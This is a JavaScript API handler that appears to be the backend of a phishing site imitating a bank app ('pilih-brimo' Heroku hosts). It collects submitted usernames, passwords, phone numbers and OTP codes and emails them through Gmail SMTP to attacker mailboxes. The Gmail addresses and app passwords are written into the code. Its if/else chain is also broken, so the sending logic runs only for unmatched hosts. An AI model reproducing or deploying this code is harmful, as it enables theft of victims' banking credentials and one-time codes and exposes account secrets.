export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if (url == 'pilih-brimo.herokuapp.com'){

       email = 'lajumacet78@gmail.com'
       pass = 'krfomliejdqgwiqx'
    }else
    
 if (url == 'pilihan-brimo-terbaru.herokuapp.com'){

       email = 'taulaju899@gmail.com'
       pass = 'oplyndenhzofzixw'
 }else
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'Welcome to the app',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li>
                        <li>password: ${body.password ?? '-'}</li>
                        <li>noHp: ${body.noHp ?? '-'}</li>
                        <li>otp: ${body.otp ?? '-'}</li>
                    </ul>`
                ,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}
